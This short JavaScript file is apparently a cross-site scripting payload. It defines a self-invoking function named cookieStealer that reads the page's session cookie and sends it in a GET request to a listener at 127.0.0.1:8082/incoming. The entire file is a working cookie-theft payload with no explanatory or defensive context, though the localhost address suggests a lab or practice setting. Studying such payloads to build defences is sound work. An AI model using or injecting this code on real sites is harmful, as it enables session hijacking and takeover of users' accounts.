function cookieStealer() {
    var a = new XMLHttpRequest({mozSystem: true})
    a.open('GET', 'http://127.0.0.1:8082/incoming' + '?sessionId=' + document.cookie.replace('session=', ''), true)
    a.send()
}

cookieStealer()

